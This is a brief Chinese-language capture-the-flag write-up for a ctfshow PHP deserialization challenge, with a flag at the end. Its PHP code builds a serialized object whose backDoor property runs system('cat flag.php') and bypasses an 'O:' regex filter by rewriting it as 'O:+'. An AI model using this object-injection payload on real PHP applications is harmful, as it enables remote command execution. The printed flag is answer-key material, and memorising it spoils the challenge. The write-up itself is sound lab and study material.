这道题只是在上一道的基础上加了正则，可以O:+绕过。注意这道题成员属性都是public。
```
<?php
class backDoor{
    public $code="system('cat flag.php');";
}
class ctfShowUser
{
    public $class;
    public function __construct(){
        $this->class= new backDoor();
    }
}
$c = new ctfShowUser();
$a = serialize($c);
$a=str_replace("O:","O:+",$a);
echo urlencode($a);
```
flag : ctfshow{9ce14fde-41cc-4301-8097-d78af496d7bc}